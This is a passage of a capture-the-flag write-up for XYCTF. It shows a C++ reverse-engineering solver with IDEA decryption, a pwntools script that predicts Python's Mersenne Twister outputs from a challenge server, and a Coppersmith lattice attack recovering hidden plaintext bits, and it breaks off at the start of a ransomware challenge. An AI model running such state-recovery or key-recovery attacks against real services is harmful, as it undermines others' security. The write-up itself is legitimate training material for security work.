class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">        <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">        <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">        <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">        <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">        <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">        <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">        <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">        <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">        <span class="number">0x46A95BAD</span>,</span><br><span class="line">        <span class="number">0x1CAC84B6</span>,</span><br><span class="line">        <span class="number">0xA67CB2B2</span>,</span><br><span class="line">        <span class="number">0x32188937</span>,</span><br><span class="line">        <span class="number">0x4872D39F</span>,</span><br><span class="line">        <span class="number">0xF2A2E59B</span>,</span><br><span class="line">        <span class="number">0x011B94D2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 爆破前7字节</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; c++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后16字节进行IDEA解密</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x5C</span>, <span class="number">0x2F</span>, <span class="number">0xD0</span>, <span class="number">0xEC</span>, <span class="number">0x82</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x57</span>,</span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x9F</span>, <span class="number">0x91</span>, <span class="number">0xF6</span>, <span class="number">0x95</span>, <span class="number">0xA4</span>, <span class="number">0xAC</span>, <span class="number">0x90</span>&#125;;</span><br><span class="line">    <span class="comment">// unsigned int key[4] = &#123;</span></span><br><span class="line">    <span class="comment">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x6C98B242</span>, <span class="number">0x78563412</span>, <span class="number">0x3E6A6D0D</span>, <span class="number">0xEFCDAB89</span>&#125;;</span><br><span class="line"></span><br><span class="line">    code keys_input[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        keys_input[<span class="number">2</span> * i + <span class="number">1</span>] = key[i] &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        keys_input[<span class="number">2</span> * i] = (key[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> result[<span class="number">16</span>];</span><br><span class="line">    bitset&lt;64&gt; cipher1, cipher2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cipher1[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">            cipher2[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i + <span class="number">8</span>] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">subkeys_get</span>(keys_input);</span><br><span class="line">    <span class="built_in">inv_subkeys_get</span>(sub_key);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plain1 = <span class="built_in">dencrypt</span>(cipher1);</span><br><span class="line">    bitset&lt;64&gt; plain2 = <span class="built_in">dencrypt</span>(cipher2);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> plain1_val = plain<span class="number">1.</span><span class="built_in">to_ullong</span>();</span><br><span class="line">    <span class="type">uint64_t</span> plain2_val = plain<span class="number">2.</span><span class="built_in">to_ullong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> dec2[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2, &amp;plain2_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2 + <span class="number">8</span>, &amp;plain1_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">reverse</span>(dec2, dec2 + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.16s\n&quot;</span>, dec2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{moshui_build_this_block}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;47.94.217.82&quot;</span>,<span class="number">28739</span> )</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;tor: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    line=<span class="built_in">int</span>(sh.recvline().decode().split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    data.append(line)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RC = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    RC.submit(i)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;er: &gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">rand1 = RC.predict_getrandbits(<span class="number">11000</span>)</span><br><span class="line">rand2 = RC.predict_getrandbits(<span class="number">10000</span>)</span><br><span class="line">correct_ans = rand1 // rand2</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(correct_ans).encode())</span><br><span class="line">sh.recvlines()  </span><br></pre></td></tr></table></figure>

<blockquote>
<p>XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}</p>
</blockquote>
<h3 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h3><p>题目构造了复数对象，混淆了m的实部和虚部的低128位,已知</p>
<p>$ m&#x3D;a+bi\<br>c&#x3D;m^3&#x3D;a^3-3ab^2+(ea^2b-b^3)i $</p>
<p>二元copper解低位即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        <span class="variable language_">self</span>.re = re</span><br><span class="line">        <span class="variable language_">self</span>.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = <span class="variable language_">self</span>.re * c.re - <span class="variable language_">self</span>.im * c.im</span><br><span class="line">        im_ = <span class="variable language_">self</span>.re * c.im + <span class="variable language_">self</span>.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.re == c.re <span class="keyword">and</span> <span class="variable language_">self</span>.im == c.im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(<span class="variable language_">self</span>.re &gt;&gt; m, <span class="variable language_">self</span>.im &gt;&gt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(<span class="variable language_">self</span>.re &lt;&lt; m, <span class="variable language_">self</span>.im &lt;&lt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(<span class="variable language_">self</span>.re)</span><br><span class="line">        <span class="keyword">elif</span> <span class="variable language_">self</span>.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="variable language_">self</span>.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [<span class="variable language_">self</span>.re, <span class="variable language_">self</span>.im]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">n = <span class="number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line">mh = [<span class="number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]</span><br><span class="line">C = [<span class="number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]</span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x,y&gt;=Zmod(<span class="built_in">int</span>(n))[]</span><br><span class="line">a=mh[<span class="number">0</span>]+x</span><br><span class="line">b=mh[<span class="number">1</span>]+y</span><br><span class="line">f1=a^<span class="number">3</span>-<span class="number">3</span>*a*b^<span class="number">2</span>-C[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">roots=small_roots(f1,bounds=(<span class="number">2</span>**<span class="number">129</span>,<span class="number">2</span>**<span class="number">129</span>),m=<span class="number">5</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(roots[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">m=Complex(mh[<span class="number">0</span>]+roots[<span class="number">0</span>][<span class="number">0</span>],mh[<span class="number">1</span>]+roots[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m.re + m.im))</span><br><span class="line"></span><br><span class="line">dec=ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(dec.decrypt(enc))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}</p>
</blockquote>
<h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>题目给出了exe和加密的16进制数据</p>
<p>pyinstxtractor反编译一下，编译task.pyc看到注释的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 